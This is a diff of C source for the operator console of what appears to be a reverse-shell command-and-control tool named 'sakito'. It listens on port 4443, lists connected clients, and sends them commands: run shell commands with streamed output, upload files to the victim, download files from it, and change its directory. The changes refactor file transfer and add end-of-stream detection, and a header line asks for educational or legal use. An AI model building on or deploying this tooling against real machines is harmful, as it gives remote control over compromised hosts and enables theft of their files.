@@ -10,9 +10,11 @@ Use this code educationally/legally.
 #include <arpa/inet.h> 
 #include <pthread.h>
 #include <stdint.h>
-#include "sakito_tools.h"
+#include "sakito_core.h"
+#include "sakito_server_tools.h"
 
 #define PORT 4443
+#define MEM_CHUNK 5
 
 // Mutex lock for pthread race condition checks.
 pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
@@ -120,25 +122,28 @@ void* accept_conns(void* param) {
 
 // Function to upload file to target machine (TCP file transfer).
 int send_file(char* const buf, const size_t cmd_len, int client_socket) {
+	// Open file.
+	FILE* fd = fopen(buf+8, "rb");
+	int32_t bytes = 0, f_size = 0;
+ 
+	// If the file exists:
+	if (!fd) {
+		puts("File not found.\n");
+		return FILE_NOT_FOUND;
+	}
+
 	// '3' is the command code for uploading a file via the client.
 	buf[7] = '3';
 
 	// Send command code + filename to be parsed.
-	if (write(client_socket, &buf[7], cmd_len) < 1)
+	if (write(client_socket, buf+7, cmd_len) < 1)
 		return -1;
- 
-	// Open file.
-	FILE* fd = fopen(&buf[8], "rb");
-	uint32_t bytes = 0, f_size = 0;
- 
-	// If the file exists:
-	if (fd) {
-		// Get file size and serialize f_size.
-		fseek(fd, 0L, SEEK_END);
-		f_size = ftell(fd);
-		bytes = htonl(f_size);
-		fseek(fd, 0L, SEEK_SET);
-	}
+
+	// Calculate file size and serialize the file size integer.
+	fseek(fd, 0L, SEEK_END);
+	f_size = ftell(fd);
+	bytes = htonl(f_size);
+	fseek(fd, 0L, SEEK_SET);
  
 	// Send the serialized file size bytes.
 	if (write(client_socket, (char*)&bytes, sizeof(bytes)) < 1)
@@ -170,30 +175,35 @@ int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
 	buf[9] = '4';
 	
 	// Send command code + filename to be parsed.
-	if (write(client_socket, &buf[9], cmd_len) < 1)
+	if (write(client_socket, buf+9, cmd_len) < 1)
 		return -1;
  
 	// Open the file.
-	FILE* fd = fopen(&buf[10], "wb");
+	FILE* fd = fopen(buf+10, "wb");
  
-	// Receive serialized file size uint32_t bytes.
-	if (read(client_socket, buf, sizeof(uint32_t)) < 1)
+	// Receive serialized file size int32_t bytes.
+	if (read(client_socket, buf, sizeof(int32_t)) < 1)
 		return -1;
  
 	// Deserialize file size bytes.
-	uint32_t f_size = ntohl_conv(&*(buf));
+	int32_t f_size = ntohl_conv(&*(buf));
 	int i_result = 1;
- 
-	// Varaible to keep track of downloaded data.
-	long int total = 0;
- 
-	// Receive all file bytes/chunks and write to file until total == file size.
-	while (total != f_size && i_result > 0) {
-		i_result = read(client_socket, buf, BUFLEN);
 
-		// Write bytes to file.
-		fwrite(buf, 1, i_result, fd);
-		total += i_result;
+	if (f_size > 0) {
+		// Varaible to keep track of downloaded data.
+		int32_t total = 0;
+	 
+		// Receive all file bytes/chunks and write to file until total == file size.
+		while (total != f_size && i_result > 0) {
+			i_result = read(client_socket, buf, BUFLEN);
+
+			// Write bytes to file.
+			fwrite(buf, 1, i_result, fd);
+			total += i_result;
+		}
+	}
+	else if (f_size == -1) {
+		puts("The client's system cannot find the file specified.\n");
 	}
  
 	// Close the file.
@@ -208,7 +218,7 @@ int client_cd(char* const buf, const size_t cmd_len, int client_socket) {
 	buf[3] = '1';
 	
 	// Send command code + directory string to be parsed.
-	if (write(client_socket, &buf[3], cmd_len) < 1)
+	if (write(client_socket, buf+3, cmd_len) < 1)
 		return -1;
  
 	return 1;
@@ -221,33 +231,35 @@ int terminate_client(char* const buf, const size_t cmd_len, int client_socket) {
  
 	return 0;
 }
- 
+
+int detect_eos(int i_result, char* const buf) {
+	if (buf[0] == '\x11' && buf[1] == '\x13' && buf[2] == '\xcf')
+		return 1;
+
+	return 0;
+}
+
 // Function to send command to client.
 int send_cmd(char* const buf, const size_t cmd_len, int client_socket) {
 	// Send command to server.
 	if (write(client_socket, buf, cmd_len) < 1)
 		return -1;
 
-	// Receive serialized output size uint32_t bytes.
-	if (read(client_socket, buf, sizeof(uint32_t)) < 1)
-		return -1;
- 
-	// Deserialize output size bytes.
-	uint32_t s_size = ntohl_conv(&*(buf));
-
 	// Initialize i_result to true.
 	int i_result = 1;
-	
+
 	// Receive command output stream and write output chunks to stdout.
 	do {
 		if ((i_result = read(client_socket, buf, BUFLEN)) < 1)
 			return i_result;
+		if (detect_eos(i_result, buf))
+			break;
 		fwrite(buf, 1, i_result, stdout);
-	} while ((s_size -= i_result) > 0);
- 
+	} while (i_result > 0);
+
 	// write a single newline to stdout for cmd line output alignment.
 	fputc('\n', stdout);
- 
+
 	return i_result;
 }
 
@@ -320,8 +332,8 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 		// Set all bytes in buffer to zero.
 		memset(buf, '\0', BUFLEN);
  		buf[0] = '0';
-		size_t cmd_len = get_line(&buf[1]) + 1;
-		char* cmd = &buf[1];
+		size_t cmd_len = get_line(buf+1) + 1;
+		char* cmd = buf+1;
 
 		if (cmd_len > 1) {
 			if (compare(cmd, "background")) {
@@ -339,7 +351,29 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 	delete_conn(conns, client_id);
 	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
 }
- 
+
+void terminate_console(Conn_map conns, pthread_t acp_thread) {
+	// Quit accepting connections.
+	pthread_cancel(acp_thread);
+	// if there's any connections close them before exiting.
+	if (conns.size) {
+		for (size_t i = 0; i < conns.size; i++)
+			close(conns.clients[i].sock);
+		// Free allocated memory.
+		free(conns.clients);
+	}
+	close(conns.listen_socket);
+}
+
+void validate_id(char buf[], Conn_map conns) {
+	int client_id;
+	client_id = atoi(buf+9);
+	if (!conns.size || client_id < 0 || client_id > conns.size - 1)
+		printf("Invalid client identifier.\n");
+	else
+		interact(&conns, buf, client_id);
+}
+
 // Function to execute command.
 void exec_cmd(char* const buf) {
 	// Call Popen to execute command(s) and read the processes' output.
@@ -385,34 +419,21 @@ int main(void) {
  
 		if (cmd_len > 1) {
 			if (compare(buf, "exit")) {
-				// Quit accepting connections.
-				pthread_cancel(acp_thread);
-				// if there's any connections close them before exiting.
-				if (conns.size) {
-					for (size_t i = 0; i < conns.size; i++)
-						close(conns.clients[i].sock);
-					// Free allocated memory.
-					free(conns.clients);
-				}
-				close(conns.listen_socket);
+				// Terminate sakito-console.
+				terminate_console(conns, acp_thread);
 				break;
 			}
 			else if (compare(buf, "cd ")) {
 				// List all connections.
-				chdir(&buf[3]);
+				chdir(buf+3);
 			}
 			else if (compare(buf, "list")) {
 				// List all connections.
 				list_connections(&conns);
 			}
 			else if (compare(buf, "interact ")) {
-				// Interact with client.
-				int client_id;
-				client_id = atoi(&buf[9]);
-				if (!conns.size || client_id < 0 || client_id > conns.size - 1)
-					printf("Invalid client identifier.\n");
-				else
-					interact(&conns, buf, client_id);
+				// If ID is valid interact with client.
+				validate_id(buf, conns);
 			}
 			else {
 				// Execute command on host system.
@@ -420,5 +441,6 @@ int main(void) {
 			}
 		}
 	}
+
 	return 0;
 }
